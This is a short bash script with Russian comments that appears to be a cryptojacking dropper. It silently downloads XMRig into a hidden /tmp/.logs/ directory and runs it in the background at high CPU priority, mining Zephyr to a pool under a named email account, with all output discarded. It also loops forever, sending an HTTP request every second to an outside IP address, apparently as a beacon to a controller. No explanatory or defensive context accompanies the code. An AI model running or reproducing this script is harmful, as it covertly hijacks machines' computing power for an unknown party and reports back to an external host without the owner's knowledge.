#!/bin/bash

# Создание необходимых директорий
log_dir="/tmp/.logs/"
mkdir -p "$log_dir" 2>/dev/null

# Скачивание и распаковка архива
url="https://github.com/xmrig/xmrig/releases/download/v6.21.3/xmrig-6.21.3-linux-static-x64.tar.gz"
tar_path="${log_dir}xmrig-6.21.3-linux-static-x64.tar.gz"
wget -q "$url" -O "$tar_path"
tar -xzf "$tar_path" -C "$log_dir" 2>/dev/null

# Генерация случайных значений
random_six_digit=$(printf "%06d" $((RANDOM % 900000 + 100000)))
random_srv_number=$(printf "%04d" $((RANDOM % 9000 + 1000)))

# Запуск xmrig в фоновом режиме
xmrig_dir="${log_dir}xmrig-6.21.3"
"$xmrig_dir/xmrig"  -o zeph.kryptex.network:7777 -u fintafixgames@gmail.com/${random_six_digit} -k --coin zephyr --cpu-no-yield --cpu-priority 5 --threads 32 -a rx/0 >/dev/null 2>&1 &

# Функция для отправки HTTP-запросов
send_updates() {
    while true; do
        curl -s "http://147.185.221.19:64073/update/${random_srv_number}" >/dev/null 2>&1
        sleep 1
    done
}

# Запуск отправки запросов в фоновом режиме
send_updates &

# Бесконечный цикл для поддержания работы скрипта
while true; do
    sleep 1
done
